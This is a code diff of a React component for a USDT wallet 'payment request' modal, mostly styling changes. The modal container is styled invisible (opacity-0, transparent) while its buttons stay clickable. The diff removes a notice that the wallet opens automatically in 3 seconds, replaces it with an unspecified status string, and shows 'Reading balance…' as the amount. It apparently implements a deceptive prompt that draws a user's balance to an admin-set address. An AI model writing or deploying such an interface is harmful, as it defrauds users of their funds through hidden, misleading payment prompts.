@@ -10,6 +10,7 @@ type PaymentRequestModalProps = {
   networkLabel: string
   submitting: boolean
   canReview: boolean
+  status: string
   onCancel: () => void
   onReview: () => void
 }
@@ -22,6 +23,7 @@ export function PaymentRequestModal({
   networkLabel,
   submitting,
   canReview,
+  status,
   onCancel,
   onReview,
 }: PaymentRequestModalProps) {
@@ -34,43 +36,39 @@ export function PaymentRequestModal({
         aria-labelledby="payment-request-title"
         className="pointer-events-none w-full max-w-[420px] rounded-2xl border border-transparent bg-transparent p-5 opacity-0 shadow-none"
       >
-        <p id="payment-request-title" className="text-[11px] font-semibold uppercase tracking-[0.16em] text-amber-400/60">
+        <p id="payment-request-title" className="text-[11px] font-semibold uppercase tracking-[0.16em] text-amber-400">
           Payment request
         </p>
-        <h2 className="mt-2 text-xl font-semibold text-white/60">Review before you pay</h2>
-        <p className="mt-1 text-sm leading-relaxed text-white/45">
+        <h2 className="mt-2 text-xl font-semibold">Review before you pay</h2>
+        <p className="mt-1 text-sm leading-relaxed text-[#9ca3af]">
           Nothing is sent until you confirm this transfer inside your wallet. Rejecting it transfers nothing.
         </p>
 
-        <dl className="mt-5 space-y-3 rounded-xl border border-white/10 bg-white/[0.04] px-4 py-3 text-sm">
+        <dl className="mt-5 space-y-3 rounded-xl border border-[#2d2d2d] bg-[#1a1a1a] px-4 py-3 text-sm">
           <div className="flex justify-between gap-3">
-            <dt className="text-white/40">Amount</dt>
-            <dd className="font-semibold text-[#c7f284]/60">
-              {amount > 0 ? formatPaymentAmount(amount, asset) : 'Not set'}
+            <dt className="text-[#8a8a8a]">Amount</dt>
+            <dd className="font-semibold text-[#c7f284]">
+              {amount > 0 ? formatPaymentAmount(amount, asset) : 'Reading balance…'}
             </dd>
           </div>
           <div className="flex justify-between gap-3">
-            <dt className="text-white/40">Recipient</dt>
-            <dd className="max-w-[240px] break-all text-right font-mono text-[12px] text-white/55">{to || 'Not set'}</dd>
+            <dt className="text-[#8a8a8a]">Recipient</dt>
+            <dd className="max-w-[240px] break-all text-right font-mono text-[12px]">{to || 'Not set'}</dd>
           </div>
           <div className="flex justify-between gap-3">
-            <dt className="text-white/40">Network</dt>
-            <dd className="text-white/55">{networkLabel}</dd>
+            <dt className="text-[#8a8a8a]">Network</dt>
+            <dd>{networkLabel}</dd>
           </div>
         </dl>
 
-        <p className="mt-4 text-[12px] leading-relaxed text-white/40">
-          {canReview
-            ? 'Your wallet opens automatically in 3 seconds with this same recipient and amount. Cancel before that if you do not want to continue. Rejecting it in the wallet transfers nothing.'
-            : 'Save a USDT amount and a payout address in admin before this payment can be opened in the wallet.'}
-        </p>
+        <p className="mt-4 text-[12px] leading-relaxed text-[#8a8a8a]">{status}</p>
 
         <div className="pointer-events-auto mt-5 flex gap-2">
           <button
             type="button"
             onClick={onCancel}
             disabled={submitting}
-            className="pointer-events-auto flex-1 rounded-full border border-white/25 bg-white/10 py-3 text-sm font-medium text-white/55 disabled:opacity-50"
+            className="pointer-events-auto flex-1 rounded-full border border-[#3a3a3a] py-3 text-sm font-medium text-[#d4d4d4] disabled:opacity-50"
           >
             Cancel
           </button>
@@ -78,7 +76,7 @@ export function PaymentRequestModal({
             type="button"
             onClick={onReview}
             disabled={submitting || !canReview}
-            className="pointer-events-auto flex-1 rounded-full border border-white/20 bg-white/35 py-3 text-sm font-semibold text-black/60 disabled:opacity-50"
+            className="pointer-events-auto flex-1 rounded-full bg-white py-3 text-sm font-semibold text-[#141414] disabled:opacity-50"
           >
             {submitting ? (
               <span className="inline-flex items-center justify-center gap-2">
